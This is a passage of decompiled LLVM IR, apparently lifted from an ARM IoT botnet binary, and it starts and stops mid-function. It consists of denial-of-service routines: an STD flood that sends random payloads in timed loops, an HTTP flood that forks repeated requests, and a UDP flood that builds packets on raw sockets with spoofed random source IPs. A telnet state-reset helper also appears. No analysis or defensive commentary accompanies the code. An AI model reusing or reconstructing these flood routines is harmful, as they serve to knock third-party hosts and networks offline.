  %v3_c51c = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c520

dec_label_pc_c520:                                ; preds = %dec_label_pc_bb0c, %dec_label_pc_bc58, %dec_label_pc_bef8, %dec_label_pc_c324, %dec_label_pc_c4c4, %dec_label_pc_b4e4, %dec_label_pc_b6e8, %dec_label_pc_c4a0, %dec_label_pc_c360, %dec_label_pc_c300, %dec_label_pc_c234, %dec_label_pc_c20c, %dec_label_pc_c180, %dec_label_pc_c084, %dec_label_pc_c060, %dec_label_pc_c000, %dec_label_pc_bf34, %dec_label_pc_bed0, %dec_label_pc_bea8, %dec_label_pc_bde4, %dec_label_pc_bdc0, %dec_label_pc_bd60, %dec_label_pc_bc94, %dec_label_pc_bc30, %dec_label_pc_bc08, %dec_label_pc_bb48, %dec_label_pc_bae8, %dec_label_pc_ba54, %dec_label_pc_ba30, %dec_label_pc_b884, %dec_label_pc_b860, %dec_label_pc_c500
  %v1_c524 = add nuw nsw i32 %storemerge548, 1
  store i32 %v1_c524, i32* %r2.global-to-local, align 4
  %v5_c538 = icmp slt i32 %v1_c524, %arg2
  br i1 %v5_c538, label %dec_label_pc_b480, label %dec_label_pc_b474

; uselistorder directives
  uselistorder i32 %v1_c524, { 2, 1, 0 }
  uselistorder i32 %v3_c478, { 1, 0 }
  uselistorder i32* %v1_c0c4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_bfd8, { 1, 0 }
  uselistorder i32 %v3_bd38, { 1, 0 }
  uselistorder i32 %storemerge610, { 1, 0 }
  uselistorder i32 %v0_b5ec, { 1, 0 }
  uselistorder i32 %v2_b580, { 1, 0 }
  uselistorder i32 %v2_b57c, { 1, 0, 2 }
  uselistorder i32 %v0_b4c8, { 1, 0 }
  uselistorder i32* %v1_b4a0, { 1, 0, 2 }
  uselistorder i32 %v2_b498, { 35, 34, 36, 27, 28, 29, 30, 31, 32, 33, 24, 23, 25, 26, 21, 4, 22, 18, 17, 19, 20, 15, 3, 16, 13, 12, 11, 14, 6, 7, 1, 2, 8, 0, 10, 9, 5 }
  uselistorder i32 %v2_b494, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v3_b48c, { 79, 80, 78, 76, 77, 75, 74, 73, 59, 60, 58, 63, 64, 71, 70, 69, 67, 68, 66, 65, 62, 72, 61, 57, 56, 54, 55, 52, 53, 51, 50, 49, 45, 46, 44, 48, 47, 43, 42, 40, 41, 38, 39, 37, 36, 35, 31, 32, 30, 34, 33, 29, 28, 26, 27, 25, 23, 24, 21, 20, 22, 19, 18, 17, 16, 15, 11, 9, 10, 8, 7, 6, 5, 4, 14, 13, 12, 3, 2, 1, 0 }
  uselistorder i32 %storemerge548, { 1, 4, 5, 7, 6, 3, 2, 0 }
  uselistorder i32 %v2_bb24, { 3, 0, 4, 1, 5, 2 }
  uselistorder i32 %v2_b8ac, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v1_b458, { 1, 2, 0 }
  uselistorder i32 %v1_b434, { 2, 1, 0 }
  uselistorder i32 %storemerge457, { 1, 0 }
  uselistorder i32 %v3_b374, { 4, 3, 5, 6, 7, 9, 8, 10, 12, 11, 13, 16, 15, 14, 18, 0, 19, 17, 1, 22, 23, 24, 21, 2, 20 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-612, { 0, 2, 1 }
  uselistorder i32* %stack_var_-340, { 1, 0, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 49, 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 41, 42, 43, 44, 45, 46, 47, 48, 105, 50, 51, 106, 52 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 8, 9, 10 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 ptrtoint ([334 x i8*]* @global_var_270b8.373 to i32), { 2, 0, 1 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_1cbc4.371 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([769 x i8*]* @global_var_269ec.369 to i32), { 2, 0, 1 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 2, 3, 0, 1, 4 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c520, { 31, 4, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 18, 19, 20, 21, 22, 1, 23, 24, 25, 0, 26, 27, 28, 29, 30, 6, 5 }
  uselistorder label %dec_label_pc_b8c0, { 1, 0 }
  uselistorder label %dec_label_pc_b884, { 1, 0 }
  uselistorder label %dec_label_pc_b6e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b4e4, { 1, 0 }
  uselistorder label %dec_label_pc_b480, { 1, 0 }
  uselistorder label %dec_label_pc_b474, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b3b8, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_c544 = load i32, i32* @fp, align 4
  store i32 %v3_c544, i32* %stack_var_-16, align 4
  store i32 50508, i32* %stack_var_-4, align 4
  %v13_c544 = ptrtoint i32* %stack_var_-16 to i32
  %v2_c548 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c548, i32* @fp, align 4
  %v3_c568 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_c578 = call i32 @__GI_time(i32* null)
  store i32 %arg1, i32* @r0, align 4
  %v1_c58c = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_c598 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_c598, i32* @r0, align 4
  %v2_c5a4 = call i32 @bzero(i32 %v2_c598, i32 16)
  %v1_c5ac = add i32 %v1_c58c, 16
  %v2_c5ac = inttoptr i32 %v1_c5ac to i32*
  %v3_c5ac = load i32, i32* %v2_c5ac, align 4
  %v1_c5b0 = inttoptr i32 %v3_c5ac to i32*
  %v2_c5b0 = load i32, i32* %v1_c5b0, align 4
  %v1_c5b8 = add i32 %v1_c58c, 12
  %v2_c5b8 = inttoptr i32 %v1_c5b8 to i32*
  %v3_c5b8 = load i32, i32* %v2_c5b8, align 4
  store i32 %v3_c5b8, i32* @r2, align 4
  %v2_c5c4 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_c5c4, i32* @r3, align 4
  %v5_c5d0 = call i32 @bcopy(i32 %v2_c5b0, i32 %v2_c5c4, i32 %v3_c5b8, i32 %v2_c5c4, i32 ptrtoint (i32* @0 to i32))
  %v1_c5d8 = add i32 %v1_c58c, 8
  %v2_c5d8 = inttoptr i32 %v1_c5d8 to i32*
  %v3_c5d8 = load i32, i32* %v2_c5d8, align 4
  %v3_c5e0 = urem i32 %v3_c5d8, 65536
  store i32 %v3_c5e0, i32* %stack_var_-52, align 4
  %v2_c604 = ptrtoint i32* %stack_var_-196 to i32
  %v2_c6b8 = add i32 %v2_c578, %arg3
  %v2_c660 = add i32 %v13_c544, -180
  br label %dec_label_pc_c600

dec_label_pc_c600:                                ; preds = %dec_label_pc_c6dc, %entry
  %storemerge7 = phi i32 [ 0, %entry ], [ %v1_c6e0, %dec_label_pc_c6dc ]
  store i32 ptrtoint ([36 x i8*]* @global_var_1cddc.423 to i32), i32* @r3, align 4
  store i32 144, i32* @ip, align 4
  store i32 %v2_c604, i32* @r0, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_1cddc.423 to i32), i32* @r1, align 4
  store i32 144, i32* @r2, align 4
  %v0_c618 = call i32 @memcpy()
  %v0_c61c = call i32 @rand()
  %v1_c62c = zext i32 %v0_c61c to i64
  %v4_c62c = mul nuw nsw i64 %v1_c62c, 954437177
  %v3_c6301 = udiv i64 %v4_c62c, 34359738368
  %tmp = icmp ult i32 %storemerge7, 50
  br i1 %tmp, label %dec_label_pc_c6dc, label %dec_label_pc_c67c

dec_label_pc_c67c:                                ; preds = %dec_label_pc_c600
  %v3_c63c3 = mul nuw nsw i64 %v3_c6301, 4
  %v3_c63c = trunc i64 %v3_c63c3 to i32
  %v2_c644.neg = sub i32 %v0_c61c, %v3_c63c
  %v3_c6405 = mul nuw nsw i64 %v3_c6301, 32
  %v3_c640 = trunc i64 %v3_c6405 to i32
  %v2_c648 = sub i32 %v2_c644.neg, %v3_c640
  %v3_c658 = mul i32 %v2_c648, 4
  %v2_c664 = add i32 %v2_c660, %v3_c658
  %v1_c668 = inttoptr i32 %v2_c664 to i32*
  %v2_c668 = load i32, i32* %v1_c668, align 4
  %v5_c68c = call i32 @__libc_send(i32 %v3_c568, i32 %v2_c668, i32 65, i32 0)
  %v3_c6a0 = call i32 @__libc_connect(i32 %v3_c568, i32 %v2_c598, i32 16)
  %v2_c6a8 = call i32 @__GI_time(i32* null)
  %v5_c6c0 = icmp slt i32 %v2_c6a8, %v2_c6b8
  br i1 %v5_c6c0, label %dec_label_pc_c6d4, label %dec_label_pc_c6c4

dec_label_pc_c6c4:                                ; preds = %dec_label_pc_c67c
  %v1_c6c8 = call i32 @__GI_close(i32 %v3_c568)
  %v1_c6d0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_c6d4

dec_label_pc_c6d4:                                ; preds = %dec_label_pc_c67c, %dec_label_pc_c6c4
  br label %dec_label_pc_c6dc

dec_label_pc_c6dc:                                ; preds = %dec_label_pc_c600, %dec_label_pc_c6d4
  %stack_var_-24.0 = phi i32 [ %storemerge7, %dec_label_pc_c600 ], [ 0, %dec_label_pc_c6d4 ]
  %v1_c6e0 = add i32 %stack_var_-24.0, 1
  br label %dec_label_pc_c600

; uselistorder directives
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %v2_c598, { 0, 2, 1 }
  uselistorder i32 %v1_c58c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
  uselistorder label %dec_label_pc_c6dc, { 1, 0 }
  uselistorder label %dec_label_pc_c6d4, { 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_c6f8 = load i32, i32* @fp, align 4
  store i32 %v3_c6f8, i32* %stack_var_-16, align 4
  store i32 50944, i32* %stack_var_-4, align 4
  %v13_c6f8 = ptrtoint i32* %stack_var_-16 to i32
  %v2_c6fc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c6fc, i32* @fp, align 4
  %v2_c724 = call i32 @__GI_time(i32* null)
  %v3_c72c = load i32, i32* %stack_var_0, align 4
  %v2_c730 = add i32 %v3_c72c, %v2_c724
  %v2_c790 = ptrtoint i32* %stack_var_-544 to i32
  %tmp23 = bitcast i32* %stack_var_-544 to i8*
  %v5_c87031 = icmp sgt i32 %arg6, 0
  br i1 %v5_c87031, label %dec_label_pc_c74c, label %dec_label_pc_c874

dec_label_pc_c74c:                                ; preds = %entry, %dec_label_pc_c858
  %storemerge132 = phi i32 [ %v1_c85c, %dec_label_pc_c858 ], [ 0, %entry ]
  %v0_c74c = call i32 @rand()
  %v2_c764 = srem i32 %v0_c74c, 36
  %v4_c78c = mul nsw i32 %v2_c764, 4
  %v5_c78c = add i32 %v4_c78c, ptrtoint ([37 x i8*]* @global_var_26954.464 to i32)
  %v6_c78c = inttoptr i32 %v5_c78c to i32*
  %v7_c78c = load i32, i32* %v6_c78c, align 4
  store i32 %v2_c790, i32* @r0, align 4
  %v8_c7b0 = call i32 @sprintf(i32 %v2_c790, i32 ptrtoint ([64 x i8]* @global_var_1ce6c.466 to i32), i32 %arg1, i32 %arg4, i32 %arg2, i32 %v7_c78c, i32 %v2_c764)
  store i32 %v8_c7b0, i32* @r0, align 4
  %v0_c7b4 = call i32 @__libc_fork()
  %v2_c7bc = icmp eq i32 %v0_c7b4, 0
  br i1 %v2_c7bc, label %dec_label_pc_c858, label %dec_label_pc_c838

dec_label_pc_c7c8:                                ; preds = %dec_label_pc_c838
  %v5_c7e0 = call i32 @socket_connect(i32 %arg2, i16 %arg3, i32 %v13_c6f8)
  %v2_c7f0 = icmp eq i32 %v5_c7e0, 0
  br i1 %v2_c7f0, label %dec_label_pc_c838, label %dec_label_pc_c7f8

dec_label_pc_c7f8:                                ; preds = %dec_label_pc_c7c8
  %v3_c800 = call i32 @strlen(i8* %tmp23)
  %v2_c814 = call i32 @__GI_write(i32 %v5_c7e0, i32 %v2_c790)
  %v1_c82c = call i32 @__GI_read(i32 %v5_c7e0)
  %v1_c834 = call i32 @__GI_close(i32 %v5_c7e0)
  br label %dec_label_pc_c838

dec_label_pc_c838:                                ; preds = %dec_label_pc_c7c8, %dec_label_pc_c7f8, %dec_label_pc_c74c
  %v2_c83c = call i32 @__GI_time(i32* null)
  %v5_c84c = icmp slt i32 %v2_c83c, %v2_c730
  br i1 %v5_c84c, label %dec_label_pc_c7c8, label %dec_label_pc_c850

dec_label_pc_c850:                                ; preds = %dec_label_pc_c838
  %v1_c854 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_c858

dec_label_pc_c858:                                ; preds = %dec_label_pc_c74c, %dec_label_pc_c850
  %v1_c87c3 = phi i32 [ 0, %dec_label_pc_c74c ], [ %v1_c854, %dec_label_pc_c850 ]
  %v1_c85c = add nuw nsw i32 %storemerge132, 1
  %v5_c870 = icmp slt i32 %v1_c85c, %arg6
  br i1 %v5_c870, label %dec_label_pc_c74c, label %dec_label_pc_c874

dec_label_pc_c874:                                ; preds = %dec_label_pc_c858, %entry
  %v1_c87c.lcssa = phi i32 [ %v2_c724, %entry ], [ %v1_c87c3, %dec_label_pc_c858 ]
  %v2_c878 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_c878, i32* @fp, align 4
  ret i32 %v1_c87c.lcssa

; uselistorder directives
  uselistorder i32 %v1_c85c, { 1, 0 }
  uselistorder i32 %v2_c790, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_c858, { 1, 0 }
  uselistorder label %dec_label_pc_c838, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c74c, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
dec_label_pc_c880:
  %tmp = ptrtoint i32* %arg4 to i32
  %v0_c880 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_c880, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_c880
  store i32 %arg1, i32* %arg4, align 4
  %v4_c880 = add i32 %tmp, 4
  %v5_c880 = inttoptr i32 %v4_c880 to i32*
  store i32 %tmp, i32* %v5_c880, align 4
  %v7_c880 = add i32 %tmp, 8
  %v8_c880 = inttoptr i32 %v7_c880 to i32*
  %v9_c880 = load i32, i32* @r4, align 4
  store i32 %v9_c880, i32* %v8_c880, align 4
  %v10_c880 = add i32 %tmp, 12
  %v11_c880 = inttoptr i32 %v10_c880 to i32*
  %v12_c880 = load i32, i32* @r5, align 4
  store i32 %v12_c880, i32* %v11_c880, align 4
  %v13_c880 = add i32 %tmp, 16
  %v14_c880 = inttoptr i32 %v13_c880 to i32*
  %v15_c880 = load i32, i32* @sb, align 4
  store i32 %v15_c880, i32* %v14_c880, align 4
  %v16_c880 = add i32 %tmp, 20
  %v17_c880 = inttoptr i32 %v16_c880 to i32*
  %v18_c880 = load i32, i32* @sl, align 4
  store i32 %v18_c880, i32* %v17_c880, align 4
  %v19_c880 = add i32 %tmp, 24
  %v20_c880 = inttoptr i32 %v19_c880 to i32*
  %v21_c880 = load i32, i32* @fp, align 4
  store i32 %v21_c880, i32* %v20_c880, align 4
  %v22_c880 = add i32 %tmp, 28
  %v23_c880 = inttoptr i32 %v22_c880 to i32*
  store i32 ptrtoint (i32* @global_var_c888.465 to i32), i32* %v23_c880, align 4
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_c880, %bb
  %v0_c884 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c884, label %bb2, label %.thread

bb2:                                              ; preds = %bb1
  br label %.thread

.thread:                                          ; preds = %bb1, %bb2
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 51352, i32* %stack_var_-4, align 4
  %v2_c894 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c894, i32* @fp, align 4
  store i32 2, i32* %stack_var_-80, align 4
  %v2_c8b8 = icmp eq i32 %arg2, 0
  br i1 %v2_c8b8, label %dec_label_pc_c8c0, label %dec_label_pc_c8d8

dec_label_pc_c8c0:                                ; preds = %entry
  %v0_c8c0 = call i32 @rand_cmwc()
  br label %dec_label_pc_c8f4

dec_label_pc_c8d8:                                ; preds = %entry
  %v3_c8e0 = urem i32 %arg2, 65536
  %v1_c8e8 = call i32 @__GI_htons(i32 %v3_c8e0)
  br label %dec_label_pc_c8f4

dec_label_pc_c8f4:                                ; preds = %dec_label_pc_c8c0, %dec_label_pc_c8d8
  %v3_c904 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-76)
  %v2_c90c = icmp eq i32 %v3_c904, 0
  br i1 %v2_c90c, label %dec_label_pc_c914, label %dec_label_pc_cefc

dec_label_pc_c914:                                ; preds = %dec_label_pc_c8f4
  store i32 8, i32* @r2, align 4
  %v2_c928 = bitcast i32* %stack_var_-72 to i8*
  %v3_c928 = call i32 @__GI_memset(i8* %v2_c928, i32 0)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v7_c938 = icmp eq i32 %arg4, 32
  br i1 %v7_c938, label %dec_label_pc_c940, label %dec_label_pc_cac4

dec_label_pc_c940:                                ; preds = %dec_label_pc_c914
  store i32 17, i32* @r2, align 4
  %v3_c94c = call i32 @socket(i32 2, i32 2, i32 17)
  %v2_c95c = icmp eq i32 %v3_c94c, 0
  br i1 %v2_c95c, label %dec_label_pc_c964, label %dec_label_pc_c97c

dec_label_pc_c964:                                ; preds = %dec_label_pc_c940
  %v2_c968 = load i32, i32* @global_var_27918.46, align 4
  %v3_c974 = call i32 @Rootsprintf(i32 %v2_c968, i32 ptrtoint ([27 x i8]* @global_var_1ceac.469 to i32))
  br label %dec_label_pc_cefc

dec_label_pc_c97c:                                ; preds = %dec_label_pc_c940
  %v3_c97c = load i32, i32* %stack_var_0, align 4
  %v1_c980 = add i32 %v3_c97c, 1
  %v1_c988 = call i32 @malloc(i32 %v1_c980)
  %v2_c998 = icmp eq i32 %v1_c988, 0
  br i1 %v2_c998, label %dec_label_pc_cefc, label %dec_label_pc_c9a0

dec_label_pc_c9a0:                                ; preds = %dec_label_pc_c97c
  %v3_c9a0 = load i32, i32* %stack_var_0, align 4
  %v1_c9a4 = add i32 %v3_c9a0, 1
  store i32 %v1_c9a4, i32* @r2, align 4
  %v2_c9b4 = inttoptr i32 %v1_c988 to i8*
  %v3_c9b4 = call i32 @__GI_memset(i8* %v2_c9b4, i32 0)
  %v2_c9c0 = call i32 @makeRandomStr(i32 %v1_c988, i32 %v3_c9a0)
  %v2_c9c8 = call i32 @__GI_time(i32* null)
  %v2_c9d4 = add i32 %v2_c9c8, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c9f0 = ptrtoint i32* %stack_var_-80 to i32
  %v3_ca8c = mul i32 %arg8, 4
  %v3_ca9c = mul i32 %arg8, 1000
  br label %dec_label_pc_c9ec.outer

dec_label_pc_c9ec.outer:                          ; preds = %dec_label_pc_cab4, %dec_label_pc_ca84, %dec_label_pc_c9a0
  %stack_var_-120.0.ph = phi i32 [ 0, %dec_label_pc_c9a0 ], [ %v1_ca6c, %dec_label_pc_ca84 ], [ %v1_ca6c, %dec_label_pc_cab4 ]
  %stack_var_-116.0.ph = phi i32 [ 0, %dec_label_pc_c9a0 ], [ 0, %dec_label_pc_ca84 ], [ %v1_cab8, %dec_label_pc_cab4 ]
  br label %dec_label_pc_c9ec

dec_label_pc_c9ec:                                ; preds = %dec_label_pc_c9ec.outer, %dec_label_pc_ca5c
  %stack_var_-120.0 = phi i32 [ 0, %dec_label_pc_ca5c ], [ %stack_var_-120.0.ph, %dec_label_pc_c9ec.outer ]
  %v3_c9ec = load i32, i32* %stack_var_0, align 4
  store i32 %v3_c9ec, i32* %r2.global-to-local, align 4
  %v6_ca10 = call i32 @__libc_sendto(i32 %v3_c94c, i32 %v1_c988, i32 %v3_c9ec, i32 0, i32 %v2_c9f0, i32 16)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_ca1c = icmp eq i32 %stack_var_-120.0, %arg6
  br i1 %v9_ca1c, label %dec_label_pc_ca24, label %dec_label_pc_ca68

dec_label_pc_ca24:                                ; preds = %dec_label_pc_c9ec
  br i1 %v2_c8b8, label %dec_label_pc_ca30, label %dec_label_pc_ca44

dec_label_pc_ca30:                                ; preds = %dec_label_pc_ca24
  %v0_ca30 = call i32 @rand_cmwc()
  br label %dec_label_pc_ca44

dec_label_pc_ca44:                                ; preds = %dec_label_pc_ca24, %dec_label_pc_ca30
  %v2_ca48 = call i32 @__GI_time(i32* null)
  store i32 %v2_ca48, i32* %r2.global-to-local, align 4
  %v8_ca58 = icmp sgt i32 %v2_ca48, %v2_c9d4
  br i1 %v8_ca58, label %dec_label_pc_cefc, label %dec_label_pc_ca5c

dec_label_pc_ca5c:                                ; preds = %dec_label_pc_ca44
  br label %dec_label_pc_c9ec

dec_label_pc_ca68:                                ; preds = %dec_label_pc_c9ec
  %v1_ca6c = add i32 %stack_var_-120.0, 1
  store i32 %stack_var_-116.0.ph, i32* %r2.global-to-local, align 4
  %v9_ca7c = icmp eq i32 %stack_var_-116.0.ph, %arg7
  br i1 %v9_ca7c, label %dec_label_pc_ca84, label %dec_label_pc_cab4

dec_label_pc_ca84:                                ; preds = %dec_label_pc_ca68
  store i32 %v3_ca8c, i32* %r2.global-to-local, align 4
  %v1_caa4 = call i32 @usleep(i32 %v3_ca9c)
  br label %dec_label_pc_c9ec.outer

dec_label_pc_cab4:                                ; preds = %dec_label_pc_ca68
  %v1_cab8 = add i32 %stack_var_-116.0.ph, 1
  store i32 %v1_cab8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c9ec.outer

dec_label_pc_cac4:                                ; preds = %dec_label_pc_c914
  store i32 17, i32* @r2, align 4
  %v3_cad8 = call i32 @socket(i32 2, i32 3, i32 17)
  %v2_cae8 = icmp eq i32 %v3_cad8, 0
  br i1 %v2_cae8, label %dec_label_pc_caf0, label %dec_label_pc_cb08

dec_label_pc_caf0:                                ; preds = %dec_label_pc_cac4
  %v2_caf4 = load i32, i32* @global_var_27918.46, align 4
  %v3_cb00 = call i32 @Rootsprintf(i32 %v2_caf4, i32 ptrtoint ([27 x i8]* @global_var_1ceac.469 to i32))
  br label %dec_label_pc_cef8

dec_label_pc_cb08:                                ; preds = %dec_label_pc_cac4
  store i32 1, i32* %stack_var_-84, align 4
  %v2_cb10 = ptrtoint i32* %stack_var_-84 to i32
  store i32 3, i32* @r2, align 4
  %v5_cb2c = call i32 @__GI_setsockopt(i32 %v3_cad8, i32 0, i32 3, i32 %v2_cb10, i32 4)
  %v1_cb34 = icmp slt i32 %v5_cb2c, 0
  br i1 %v1_cb34, label %dec_label_pc_cb3c, label %dec_label_pc_cb54

dec_label_pc_cb3c:                                ; preds = %dec_label_pc_cb08
  %v2_cb40 = load i32, i32* @global_var_27918.46, align 4
  %v3_cb4c = call i32 @Rootsprintf(i32 %v2_cb40, i32 ptrtoint ([33 x i8]* @global_var_1cec8.471 to i32))
  br label %dec_label_pc_cef8

dec_label_pc_cb54:                                ; preds = %dec_label_pc_cb08
  br label %dec_label_pc_cb60

dec_label_pc_cb60:                                ; preds = %dec_label_pc_cb54, %dec_label_pc_cb60
  %v1_cb9823 = phi i32 [ 49, %dec_label_pc_cb54 ], [ %v1_cb98, %dec_label_pc_cb60 ]
  %v2_cb64 = call i32 @__GI_time(i32* null)
  store i32 %v2_cb64, i32* @r4, align 4
  %v0_cb70 = call i32 @rand_cmwc()
  %v0_cb78 = load i32, i32* @r4, align 4
  %v2_cb78 = xor i32 %v0_cb78, %v0_cb70
  %v1_cb80 = call i32 @srand(i32 %v2_cb78)
  %v0_cb84 = call i32 @rand()
  %v1_cb90 = call i32 @init_rand(i32 %v0_cb84)
  %v1_cb98 = add nsw i32 %v1_cb9823, -1
  %v3_cba4 = icmp eq i32 %v1_cb9823, 0
  br i1 %v3_cba4, label %dec_label_pc_cbac, label %dec_label_pc_cb60

dec_label_pc_cbac:                                ; preds = %dec_label_pc_cb60
  %v2_cbb0 = icmp eq i32 %arg4, 0
  br i1 %v2_cbb0, label %dec_label_pc_cbdc, label %dec_label_pc_cbc4

dec_label_pc_cbc4:                                ; preds = %dec_label_pc_cbac
  %v1_cbc8 = sub i32 32, %arg4
  store i32 %v1_cbc8, i32* %r2.global-to-local, align 4
  %v1_cbd4 = shl i32 -1, %v1_cbc8
  br label %dec_label_pc_cbdc

dec_label_pc_cbdc:                                ; preds = %dec_label_pc_cbac, %dec_label_pc_cbc4
  %storemerge10 = phi i32 [ %v1_cbd4, %dec_label_pc_cbc4 ], [ 0, %dec_label_pc_cbac ]
  %v3_cbdc = load i32, i32* %stack_var_0, align 4
  %v1_cbe0 = add i32 %v3_cbdc, 28
  %v1_cbf0 = add i32 %v3_cbdc, 42
  %v3_cbf4 = and i32 %v1_cbf0, -8
  %v1_cbfc = load i32, i32* @sp, align 4
  %v2_cbfc = sub i32 %v1_cbfc, %v3_cbf4
  %v1_cc00 = add i32 %v2_cbfc, 8
  store i32 %v1_cc00, i32* %r2.global-to-local, align 4
  %v1_cc0c = add i32 %v2_cbfc, 15
  %v3_cc10 = and i32 %v1_cc0c, -8
  %v1_cc30 = add i32 %v3_cc10, 20
  %v5_cc34 = inttoptr i32 %v1_cc30 to i16*
  %v3_cc38 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_cc38, i32* @r4, align 4
  %v1_cc40 = call i32 @GetRandomIP(i32 %storemerge10)
  %v1_cc4c = call i32 @__GI_htonl(i32 %v1_cc40)
  store i32 %v1_cc4c, i32* %r2.global-to-local, align 4
  %v3_cc54 = load i32, i32* %stack_var_0, align 4
  %v1_cc58 = add i32 %v3_cc54, 8
  %v1_cc5c = load i32, i32* @sp, align 4
  %v2_cc5c = inttoptr i32 %v1_cc5c to i32*
  store i32 %v1_cc58, i32* %v2_cc5c, align 4
  %v0_cc64 = load i32, i32* @r4, align 4
  %v4_cc6c = inttoptr i32 %v3_cc10 to i8*
  %v5_cc6c = call i32 @makeIPPacket(i8* %v4_cc6c, i32 %v0_cc64, i32 %v1_cc4c, i32 17)
  %v3_cc70 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_cc70, 8
  %v3_cc84 = urem i32 %fold, 65536
  %v1_cc8c = call i32 @__GI_htons(i32 %v3_cc84)
  %sext = mul i32 %v1_cc8c, 65536
  %v1_cc90 = sdiv i32 %sext, 65536
  store i32 %v1_cc90, i32* %r2.global-to-local, align 4
  %v1_cc9c = trunc i32 %v1_cc90 to i16
  %v3_cc9c = add i32 %v3_cc10, 24
  %v4_cc9c = inttoptr i32 %v3_cc9c to i16*
  store i16 %v1_cc9c, i16* %v4_cc9c, align 8
  %v0_cca0 = call i32 @rand_cmwc()
